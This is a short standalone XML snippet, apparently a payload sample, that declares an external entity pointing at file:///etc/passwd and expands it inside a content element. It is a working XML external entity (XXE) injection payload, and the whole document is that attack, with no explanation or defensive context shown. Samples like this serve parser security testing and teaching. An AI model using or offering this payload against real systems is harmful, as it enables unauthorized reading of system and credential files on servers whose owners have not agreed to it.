

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <content>&xxe;</content>
</root>
```

